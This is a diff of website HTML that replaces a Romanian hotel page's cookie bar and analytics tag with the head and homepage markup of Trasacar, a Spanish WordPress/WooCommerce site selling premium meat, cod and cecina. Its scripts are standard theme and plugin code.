+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="pingback" href="https://trasacar.es/xmlrpc.php" />
 
-<a href="http://www.hotelalinalex.ro" id="hotelmobilelink">Acceseaza website</a>
+	<script type="text/javascript">
+		document.documentElement.className = 'js';
+	</script>
+
+	<script>var et_site_url='https://trasacar.es';var et_post_id='4388';function et_core_page_resource_fallback(a,b){"undefined"===typeof b&&(b=a.sheet.cssRules&&0===a.sheet.cssRules.length);b&&(a.onerror=null,a.onload=null,a.href?a.href=et_site_url+"/?et_core_page_resource="+a.id+et_post_id:a.src&&(a.src=et_site_url+"/?et_core_page_resource="+a.id+et_post_id))}
+</script><title>TRASACAR | Productos de Lujo</title>
+<link rel="alternate" hreflang="en" href="index.html@lang=en.html" />
+<link rel="alternate" hreflang="es" href="index.html" />
+<link rel='dns-prefetch' href='https://cdn.jsdelivr.net/' />
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+<link rel="alternate" type="application/rss+xml" title="TRASACAR &raquo; Feed" href="feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="TRASACAR &raquo; RSS de los comentarios" href="comments/feed/index.html" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/trasacar.es\/wp-includes\/js\/wp-emoji-release.min.js"}};
+			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<meta content="Trasacar v.1.0" name="generator"/><style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='wc-block-style-css'  href='wp-content/plugins/woocommerce/packages/woocommerce-blocks/build/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='cookie-notice-front-css'  href='wp-content/plugins/cookie-notice/css/front.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='woo-advanced-discounts-css'  href='wp-content/plugins/woo-advanced-discounts/public/css/wad-public.css' type='text/css' media='all' />
+<link rel='stylesheet' id='o-tooltip-css'  href='wp-content/plugins/woo-advanced-discounts/public/css/tooltip.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='woocommerce-layout-css'  href='wp-content/plugins/woocommerce/assets/css/woocommerce-layout.css' type='text/css' media='all' />
+<link rel='stylesheet' id='woocommerce-smallscreen-css'  href='wp-content/plugins/woocommerce/assets/css/woocommerce-smallscreen.css' type='text/css' media='only screen and (max-width: 0px)' />
+<link rel='stylesheet' id='woocommerce-general-css'  href='wp-content/plugins/woocommerce/assets/css/woocommerce.css' type='text/css' media='all' />
+<style id='woocommerce-inline-inline-css' type='text/css'>
+.woocommerce form .form-row .required { visibility: visible; }
+</style>
+<link rel='stylesheet' id='wpml-menu-item-0-css'  href='wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/menu-item/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='wpml-tm-admin-bar-css'  href='wp-content/plugins/wpml-translation-management/res/css/admin-bar-style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='Divi-css'  href='wp-content/themes/Divi/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='divi-style-css'  href='wp-content/themes/trasacar/style.css' type='text/css' media='all' />
+<link rel='stylesheet' id='et-builder-googlefonts-cached-css'  href='https://fonts.googleapis.com/css?family=Playfair+Display%3Aregular%2Citalic%2C700%2C700italic%2C900%2C900italic%7CNunito%3A200%2C200italic%2C300%2C300italic%2Cregular%2Citalic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CMontserrat%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2Cregular%2Citalic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;ver=5.2.6#038;subset=latin,latin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='dashicons-css'  href='wp-includes/css/dashicons.min.css' type='text/css' media='all' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+var cnArgs = {"ajaxurl":"https:\/\/trasacar.es\/wp-admin\/admin-ajax.php","hideEffect":"fade","onScroll":"","onScrollOffset":"100","onClick":"","cookieName":"cookie_notice_accepted","cookieTime":"2592000","cookieTimeRejected":"2592000","cookiePath":"\/","cookieDomain":"","redirection":"","cache":"","refuse":"no","revoke_cookies":"0","revoke_cookies_opt":"automatic","secure":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/plugins/cookie-notice/js/front.min.js'></script>
+<script type='text/javascript' src='wp-includes/js/jquery/jquery.js'></script>
+<script type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.min.js'></script>
+<script type='text/javascript' src='wp-content/plugins/woo-advanced-discounts/public/js/wad-public.js'></script>
+<script type='text/javascript' src='wp-content/plugins/woo-advanced-discounts/public/js/tooltip.min.js'></script>
+<script type='text/javascript' src='https://cdn.jsdelivr.net/npm/es6-promise@4/dist/es6-promise.auto.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var et_core_api_spam_recaptcha = {"site_key":"","page_action":{"action":"trasacar_es"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/themes/Divi/core/admin/js/recaptcha.js'></script>
+<link rel='https://api.w.org/' href='wp-json/index.html' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc.php@rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.2.6" />
+<meta name="generator" content="WooCommerce 4.0.1" />
+<link rel="canonical" href="index.html" />
+<link rel='shortlink' href='index.html' />
+<link rel="alternate" type="application/json+oembed" href="wp-json/oembed/1.0/embed@url=https%253A%252F%252Ftrasacar.es%252F" />
+<link rel="alternate" type="text/xml+oembed" href="wp-json/oembed/1.0/embed@url=https%253A%252F%252Ftrasacar.es%252F&amp;format=xml" />
+<meta name="generator" content="WPML ver:4.3.11 stt:1,2;" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />	<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
+	<style type="text/css" id="custom-background-css">
+body.custom-background { background-image: url("wp-content/uploads/fondo.png"); background-position: left top; background-size: auto; background-repeat: repeat; background-attachment: fixed; }
+</style>
+	<meta http-equiv="Expires" content="0"><meta http-equiv="Last-Modified" content="0"><meta http-equiv="Cache-Control" content="no-cache, mustrevalidate"><meta http-equiv="Pragma" content="no-cache">
+
+
+<script>
+		
+// Abrir Facebook en ventana nueva
+ jQuery(document).ready(function($){
+    $('.et-social-icon .icon').each(function(){
+        $(this).attr('target', 'blank');
+    });
+});
+	
+// Open Woocommmerce terms and conditions in a new tab
+jQuery(function($){
+$( "a.woocommerce-terms-and-conditions-link" ).unbind( "click" );
+$( "body" ).on('click', 'a.woocommerce-terms-and-conditions-link', function( event ) {
     
-    	<div id="cookie-footer-bar">
-		<p>
-			Acest site foloseşte cookies! Continuarea navigării implică acceptarea lor.&nbsp;<a href="index.html@accept-cookies-policy=2.html" id="cookie-accept-button" title="Accept">Accept</a>&nbsp;<a href="politica-de-utilizare-cookie/index.html" id="cookie-details-button" title="Detalii">Detalii</a> 		</p>
-	</div>
-    
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-121093078-1"></script>
+     $(this).attr("target", "_blank");
+    window.open( $(this).attr("href"));
+
+    return false;
+});
+
+});
+	
+</script><link rel="icon" href="wp-content/uploads/cropped-cropped-trasacar-1-32x32.png" sizes="32x32" />
+<link rel="icon" href="wp-content/uploads/cropped-cropped-trasacar-1-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="wp-content/uploads/cropped-cropped-trasacar-1-180x180.png" />
+<meta name="msapplication-TileImage" content="https://trasacar.es/wp-content/uploads/cropped-cropped-trasacar-1-270x270.png" />
+<link rel="stylesheet" id="et-core-unified-4388-cached-inline-styles" href="wp-content/et-cache/4388/et-core-unified-4388-15880012076877.min.css" onerror="et_core_page_resource_fallback(this, true)" onload="et_core_page_resource_fallback(this)" /></head>
+<body data-rsssl=1 class="home page-template-default page page-id-4388 custom-background theme-Divi cookies-not-set woocommerce-no-js et_button_no_icon et_pb_button_helper_class et_fixed_nav et_show_nav et_secondary_nav_enabled et_secondary_nav_two_panels et_primary_nav_dropdown_animation_fade et_secondary_nav_dropdown_animation_fade et_header_style_split et_pb_footer_columns4 et_pb_gutter et_pb_gutters3 et_pb_pagebuilder_layout et_smooth_scroll et_no_sidebar et_divi_theme et-db et_minified_js et_minified_css">
+	<div id="page-container">
+
+					<div id="top-header">
+			<div class="container clearfix">
+
+			
+				<div id="et-info">
+									<span id="et-info-phone"><a href="tel:+34985985244">+34 985 985 244</a></span>
+				
+									<a href="mailto:"><span id="et-info-email"></span></a>
+				
+				<ul class="et-social-icons">
+
+	<li class="et-social-icon et-social-facebook">
+		<a href="https://www.facebook.com/Trasacar-Productos-de-Lujo-932047646822855/" class="icon">
+			<span>Facebook</span>
+		</a>
+	</li>
+		<li class="et-social-icon et-social-instagram">
+		<a href="https://www.instagram.com/TRASACAR/" class="icon">
+			<span>Instagram</span>
+		</a>
+	</li>
+	<li class="et-social-icon et-social-youtube">
+		<a href="https://www.youtube.com/channel/UCRzL06fwb89MtgKS5yXla5Q" class="icon">
+			<span>Youtube</span>
+		</a>
+	</li>
+	<li class="et-social-icon et-social-twitter">
+		<a href="https://twitter.com/trasacar" class="icon">
+			<span>Twitter</span>
+		</a>
+	</li>
+	
+
+</ul>				</div> <!-- #et-info -->
+
+			
+				<div id="et-secondary-menu">
+				<div class="et_duplicate_social_icons">
+								<ul class="et-social-icons">
+
+	<li class="et-social-icon et-social-facebook">
+		<a href="https://www.facebook.com/Trasacar-Productos-de-Lujo-932047646822855/" class="icon">
+			<span>Facebook</span>
+		</a>
+	</li>
+		<li class="et-social-icon et-social-instagram">
+		<a href="https://www.instagram.com/TRASACAR/" class="icon">
+			<span>Instagram</span>
+		</a>
+	</li>
+	<li class="et-social-icon et-social-youtube">
+		<a href="https://www.youtube.com/channel/UCRzL06fwb89MtgKS5yXla5Q" class="icon">
+			<span>Youtube</span>
+		</a>
+	</li>
+	<li class="et-social-icon et-social-twitter">
+		<a href="https://twitter.com/trasacar" class="icon">
+			<span>Twitter</span>
+		</a>
+	</li>
+	
+
+</ul>
+							</div><ul id="et-secondary-nav" class="menu"><li class="hide-mobile mi-cuenta-icono menu-item menu-item-type-post_type menu-item-object-page menu-item-4612"><a href="index.html@p=13.html">REGISTRO</a></li>
+</ul><a href="index.html@p=11.html" class="et-cart-info">
+<span>0</span>
+</a>				</div> <!-- #et-secondary-menu -->
+
+			</div> <!-- .container -->
+		</div> <!-- #top-header -->
+		
+	
+			<header id="main-header" data-height-onload="50">
+			<div class="container clearfix et_menu_container">
+							<div class="logo_container">
+					<span class="logo_helper"></span>
+					<a href="index.html">
+						<img src="wp-content/uploads/trasacar.png" alt="TRASACAR" id="logo" data-height-percentage="100" />
+					</a>
+				</div>
+							<div id="et-top-navigation" data-height="50" data-fixed-height="50">
+											<nav id="top-menu-nav">
+						<ul id="top-menu" class="nav"><li id="menu-item-wpml-ls-41-en" class="menu-item wpml-ls-slot-41 wpml-ls-item wpml-ls-item-en wpml-ls-menu-item wpml-ls-first-item menu-item-type-wpml_ls_menu_item menu-item-object-wpml_ls_menu_item menu-item-wpml-ls-41-en"><a href="index.html@lang=en.html"><img class="wpml-ls-flag" src="wp-content/plugins/sitepress-multilingual-cms/res/flags/en.png" alt="Inglés"></a></li>
+<li id="menu-item-wpml-ls-41-es" class="menu-item wpml-ls-slot-41 wpml-ls-item wpml-ls-item-es wpml-ls-current-language wpml-ls-menu-item wpml-ls-last-item menu-item-type-wpml_ls_menu_item menu-item-object-wpml_ls_menu_item menu-item-wpml-ls-41-es"><a href="index.html"><img class="wpml-ls-flag" src="wp-content/plugins/sitepress-multilingual-cms/res/flags/es.png" alt="Español"></a></li>
+<li id="menu-item-6650" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-4388 current_page_item menu-item-6650"><a href="index.html" aria-current="page">Inicio</a></li>
+<li id="menu-item-4544" class="hide-mobile menu-item menu-item-type-post_type menu-item-object-page menu-item-4544"><a href="index.html@p=3304.html">Nosotros</a></li>
+<li id="menu-item-4571" class="hide-desktop menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4571"><a href="index.html#">Nosotros</a>
+<ul class="sub-menu">
+	<li id="menu-item-4565" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4565"><a href="index.html@p=3304.html">Conócenos</a></li>
+	<li id="menu-item-4566" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4566"><a href="index.html@p=367.html">Nuestro origen</a></li>
+	<li id="menu-item-4567" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4567"><a href="index.html@p=347.html">Instalaciones</a></li>
+	<li id="menu-item-4568" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4568"><a href="index.html@p=371.html">Calidad</a></li>
+	<li id="menu-item-4569" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4569"><a href="index.html@p=3305.html">Servicios a hostelería</a></li>
+	<li id="menu-item-4570" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4570"><a href="index.html@p=3310.html">Localización</a></li>
+</ul>
+</li>
+<li id="menu-item-4545" class="hide-mobile menu-item menu-item-type-post_type menu-item-object-page menu-item-4545"><a href="index.html@p=436.html">Productos</a></li>
+<li id="menu-item-4577" class="hide-desktop menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4577"><a href="index.html#">Productos</a>
+<ul class="sub-menu">
+	<li id="menu-item-4574" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4574"><a href="index.html@p=436.html">Nuestras carnes</a></li>
+	<li id="menu-item-4575" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4575"><a href="index.html@p=438.html">Nuestro bacalao</a></li>
+	<li id="menu-item-4547" class="hide-mobile menu-item menu-item-type-post_type menu-item-object-page menu-item-4547"><a href="index.html@p=3306.html">Particulares</a></li>
+	<li id="menu-item-4576" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4576"><a href="index.html@p=440.html">Nuestra cecina</a></li>
+</ul>
+</li>
+<li id="menu-item-4546" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4546"><a href="index.html@p=3305.html">Hostelería</a></li>
+<li id="menu-item-6647" class="hide-mobile menu-item menu-item-type-post_type menu-item-object-page menu-item-6647"><a href="index.html@p=3306.html">Tienda Online</a></li>
+<li id="menu-item-6648" class="hide-desktop menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-6648"><a href="index.html@p=3306.html">Tienda Online</a>
+<ul class="sub-menu">
+	<li id="menu-item-7344" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7344"><a href="index.html@p=7054.html">Quédate en casa Packs</a></li>
+	<li id="menu-item-4580" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4580"><a href="categoria/chuleton/index.html">Chuletón</a></li>
+	<li id="menu-item-4581" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4581"><a href="categoria/entrecote/index.html">Entrecote</a></li>
+	<li id="menu-item-4582" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4582"><a href="categoria/otros-cortes/index.html">Otros cortes</a></li>
+	<li id="menu-item-4586" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4586"><a href="categoria/cecina/index.html">Cecina</a></li>
+	<li id="menu-item-4585" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4585"><a href="categoria/bacalao/index.html">Bacalao</a></li>
+	<li id="menu-item-4583" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4583"><a href="categoria/conservas-de-lujo/index.html">Conservas de lujo</a></li>
+</ul>
+</li>
+<li id="menu-item-4588" class="hide-desktop menu-item menu-item-type-post_type menu-item-object-page menu-item-4588"><a href="index.html@p=4270.html">Contacto</a></li>
+<li id="menu-item-4587" class="hide-desktop menu-item menu-item-type-post_type menu-item-object-page menu-item-4587"><a href="index.html@p=13.html">Mi cuenta</a></li>
+<li id="menu-item-4550" class="hide-mobile menu-item menu-item-type-post_type menu-item-object-page menu-item-4550"><a href="index.html@p=3310.html">Localización</a></li>
+<li id="menu-item-7532" class="hide-desktop menu-item menu-item-type-custom menu-item-object-custom menu-item-7532"><a href="index.html@p=11.html">VER CARRITO</a></li>
+</ul>						</nav>
+					
+					
+					
+					
+					<div id="et_mobile_nav_menu">
+				<div class="mobile_nav closed">
+					<span class="select_page">Seleccionar página</span>
+					<span class="mobile_menu_bar mobile_menu_bar_toggle"></span>
+				</div>
+			</div>				</div> <!-- #et-top-navigation -->
+			</div> <!-- .container -->
+			<div class="et_search_outer">
+				<div class="container et_search_form_container">
+					<form role="search" method="get" class="et-search-form" action="index.html">
+					<input type="search" class="et-search-field" placeholder="Búsqueda &hellip;" value="" name="s" title="Buscar:" />					</form>
+					<span class="et_close_search_field"></span>
+				</div>
+			</div>
+		</header> <!-- #main-header -->
+			<div id="et-main-area">
+
+	
+<div id="main-content">
+
+
+			
+				<article id="post-4388" class="post-4388 page type-page status-publish hentry">
+
+				
+					<div class="entry-content">
+					<div id="et-boc" class="et-boc">
+			
+		<div class="et-l et-l--post">
+			<div class="et_builder_inner_content et_pb_gutters3">
+		<div class="et_pb_section et_pb_section_0 et_pb_with_background et_pb_fullwidth_section et_section_regular" >
+				
+				
+				
+				
+					<section id="imagen-inicio" class="et_pb_module et_pb_fullwidth_header et_pb_fullwidth_header_0 et_clickable et_pb_text_align_left et_pb_bg_layout_dark">
+				
+				
+				<div class="et_pb_fullwidth_header_container left">
+					
+					
+				</div>
+				<div class="et_pb_fullwidth_header_overlay"></div>
+				<div class="et_pb_fullwidth_header_scroll"></div>
+			</section>
+				
+				
+			</div> <!-- .et_pb_section --><div id="conocenos" class="et_pb_section et_pb_section_1 et_pb_with_background et_pb_inner_shadow et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_0">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_0  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_0 et_animated  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><h3>La Calidad es nuestra razón de ser</h3></div>
+			</div> <!-- .et_pb_text --><div class="et_pb_module et_pb_image et_pb_image_0">
+				
+				
+				<span class="et_pb_image_wrap "><img src="wp-content/uploads/trasacar-xl.png" alt="" title="" srcset="wp-content/uploads/trasacar-xl.png 500w, wp-content/uploads/trasacar-xl-300x164.png 300w" sizes="(max-width: 500px) 100vw, 500px" /></span>
+			</div><div class="et_pb_module et_pb_text et_pb_text_1  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><h2>Somos Trasacar</h2></div>
+			</div> <!-- .et_pb_text --><div class="et_pb_module et_pb_text et_pb_text_2 et_animated  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner">Somos Trasacar, una compañía asturiana afincada cerca de Oviedo y con una trayectoria de más de 30 años. Nos dedicamos a la distribución de productos de alimentación que demandan todos aquellos establecimientos que trabajan una materia prima diferencial.</div>
+			</div> <!-- .et_pb_text --><div class="et_pb_button_module_wrapper et_pb_button_0_wrapper et_pb_button_alignment_center et_pb_module ">
+				<a class="et_pb_button et_pb_button_0 et_pb_bg_layout_light" href="trasacar/nosotros/index.html">Conócenos</a>
+			</div>
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_2 et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_1 et_pb_gutters1">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_1  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_gallery et_pb_gallery_0  et_pb_bg_layout_light et_pb_gallery_grid">
+				<div class="et_pb_gallery_items et_post_gallery clearfix" data-per_page="4"><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_0_0">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/TRASACAR-016.jpg" title="TRASACAR-016">
+					<img src="wp-content/uploads/TRASACAR-016-400x284.jpg" srcset="wp-content/uploads/TRASACAR-016.jpg 479w, wp-content/uploads/TRASACAR-016-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_0_1">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/TRASACAR-013.jpg" title="TRASACAR-013">
+					<img src="wp-content/uploads/TRASACAR-013-400x284.jpg" srcset="wp-content/uploads/TRASACAR-013.jpg 479w, wp-content/uploads/TRASACAR-013-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_0_2">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/TRASACAR-025.jpg" title="TRASACAR-025">
+					<img src="wp-content/uploads/TRASACAR-025-400x284.jpg" srcset="wp-content/uploads/TRASACAR-025.jpg 479w, wp-content/uploads/TRASACAR-025-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_0_3">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/TRASACAR-020.jpg" title="TRASACAR-020">
+					<img src="wp-content/uploads/TRASACAR-020-400x284.jpg" srcset="wp-content/uploads/TRASACAR-020.jpg 479w, wp-content/uploads/TRASACAR-020-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div></div><!-- .et_pb_gallery_items --></div><!-- .et_pb_gallery -->
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_3 et_pb_section_parallax et_pb_with_background et_section_regular" >
+				
+				<div class="et_parallax_bg_wrap"><div
+						class="et_parallax_bg et_pb_parallax_css"
+						style="background-image: url(wp-content/uploads/TRASACAR-011.jpg);"
+					></div></div>
+				
+				
+					
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_4 et_pb_inner_shadow et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_2">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_2  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_3 et_animated  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><h3>MATERIAS PRIMAS DE ALTA CALIDAD</h3></div>
+			</div> <!-- .et_pb_text --><div class="et_pb_module et_pb_image et_pb_image_1">
+				
+				
+				<span class="et_pb_image_wrap "><img src="wp-content/uploads/9-CHULETA-PULIDA-RACIONADA-800-GR-900-GR___.jpg" alt="" title="" srcset="wp-content/uploads/9-CHULETA-PULIDA-RACIONADA-800-GR-900-GR___.jpg 1920w, wp-content/uploads/9-CHULETA-PULIDA-RACIONADA-800-GR-900-GR___-300x200.jpg 300w, wp-content/uploads/9-CHULETA-PULIDA-RACIONADA-800-GR-900-GR___-768x512.jpg 768w, wp-content/uploads/9-CHULETA-PULIDA-RACIONADA-800-GR-900-GR___-1080x720.jpg 1080w, wp-content/uploads/9-CHULETA-PULIDA-RACIONADA-800-GR-900-GR___-600x400.jpg 600w" sizes="(max-width: 1920px) 100vw, 1920px" /></span>
+			</div><div class="et_pb_module et_pb_text et_pb_text_4  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><div id="column">
+<div class="holder">
+<h2>Productos</h2>
+</div>
+</div></div>
+			</div> <!-- .et_pb_text --><div class="et_pb_module et_pb_text et_pb_text_5 et_animated  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><p>Nuestra actividad comercial se desarrolla dentro del marco más exclusivo del sector de la alimentación, ofreciendo servicio a la alta restauración en el ámbito nacional.</p></div>
+			</div> <!-- .et_pb_text -->
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row --><div class="et_pb_row et_pb_row_3 productos">
+				<div class="et_pb_column et_pb_column_1_3 et_pb_column_3  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_0 et_clickable  et_pb_text_align_left  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_blurb_content">
+					<div class="et_pb_main_blurb_image"><a href="trasacar/nuestras-carnes/index.html"><span class="et_pb_image_wrap"><img src="wp-content/uploads/carnes_trasacar_2.jpg" alt="" srcset="wp-content/uploads/carnes_trasacar_2.jpg 1920w, wp-content/uploads/carnes_trasacar_2-300x179.jpg 300w, wp-content/uploads/carnes_trasacar_2-768x458.jpg 768w, wp-content/uploads/carnes_trasacar_2-200x120.jpg 200w, wp-content/uploads/carnes_trasacar_2-1080x645.jpg 1080w, wp-content/uploads/carnes_trasacar_2-600x358.jpg 600w" sizes="(max-width: 1920px) 100vw, 1920px" class="et-waypoint et_pb_animation_top" /></span></a></div>
+					<div class="et_pb_blurb_container">
+						<h4 class="et_pb_module_header"><a href="trasacar/nuestras-carnes/index.html">Nuestras Carnes</a></h4>
+						<div class="et_pb_blurb_description"><p>La carne que trabajamos en Trasacar, con un sabor intenso, jugosa y tierna, proviene de las mejores reses de diferentes ganaderías situadas en el entorno de la CEE.</p></div>
+					</div>
+				</div> <!-- .et_pb_blurb_content -->
+			</div> <!-- .et_pb_blurb -->
+			</div> <!-- .et_pb_column --><div class="et_pb_column et_pb_column_1_3 et_pb_column_4  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_1 et_clickable  et_pb_text_align_left  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_blurb_content">
+					<div class="et_pb_main_blurb_image"><a href="trasacar/nuestro-bacalao/index.html"><span class="et_pb_image_wrap"><img src="wp-content/uploads/bacalao_5.jpg" alt="" srcset="wp-content/uploads/bacalao_5.jpg 1920w, wp-content/uploads/bacalao_5-300x200.jpg 300w, wp-content/uploads/bacalao_5-768x512.jpg 768w, wp-content/uploads/bacalao_5-1080x720.jpg 1080w, wp-content/uploads/bacalao_5-600x400.jpg 600w" sizes="(max-width: 1920px) 100vw, 1920px" class="et-waypoint et_pb_animation_top" /></span></a></div>
+					<div class="et_pb_blurb_container">
+						<h4 class="et_pb_module_header"><a href="trasacar/nuestro-bacalao/index.html">Nuestro Bacalao</a></h4>
